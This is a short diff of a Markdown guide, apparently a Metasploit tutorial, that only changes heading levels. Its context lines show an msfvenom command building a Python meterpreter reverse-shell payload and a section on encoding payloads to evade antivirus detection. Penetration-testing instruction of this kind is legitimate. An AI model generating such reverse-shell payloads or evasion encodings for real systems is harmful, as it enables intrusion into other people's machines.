@@ -167,7 +167,7 @@ This will display a list of commands available in the Metasploit console.
 
 
 ---
-# Here are more **examples for creating payloads** using `msfvenom`. These examples cover various platforms, formats, and use cases.
+### Here are more **examples for creating payloads** using `msfvenom`. These examples cover various platforms, formats, and use cases.
 
 ---
 
@@ -281,7 +281,7 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw 
 
 ---
 
-### **Encoders**
+# **Encoders**
 
 #### 14. Encoding the Payload
 To evade basic antivirus detection, encode your payload using encoders:
